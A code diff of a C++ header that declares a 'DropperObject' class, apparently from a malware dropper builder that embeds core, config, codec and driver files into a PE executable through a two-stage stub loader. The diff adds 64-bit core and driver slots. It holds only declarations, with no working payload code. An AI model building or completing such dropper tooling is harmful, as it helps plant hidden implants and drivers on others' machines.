@@ -43,11 +43,13 @@ private:
 	
 	struct {
 		NamedFileBuffer core;
+		NamedFileBuffer core64;
 		NamedFileBuffer config;
 		NamedFileBuffer driver;
+		NamedFileBuffer driver64;
 		NamedFileBuffer codec;
 	} _files;
-
+	
 	PatchBuffer _patches[2]; // patch buffers for 2 stages of stub loader
 	
 	bool _readFile(std::string path, NamedFileBuffer& buffer);
@@ -68,9 +70,11 @@ private:
 	}
 	
 	bool _addCoreFile(std::string path, std::string name);
+	bool _addCore64File(std::string path, std::string name);
 	bool _addConfigFile(std::string path, std::string name);
 	bool _addCodecFile(std::string path, std::string name);
 	bool _addDriverFile(std::string path, std::string name);
+	bool _addDriver64File(std::string path, std::string name);
 	
 	int _getIATCallIndex(std::string dll, std::string call);
 	
@@ -79,7 +83,7 @@ private:
 public:
 	DropperObject(PEObject& pe);
 	
-	bool build( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir);
+	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir);
 	
 	char* getRestoreStub() 
 	{ 
@@ -98,6 +102,7 @@ public:
 	char const * const data() { return _data.get(); }
 	std::size_t const size() { return _size; }
 	std::size_t epOffset() { return _epOffset; }
+
 };
 
 #endif /* _DROPPER_SECTION_H */
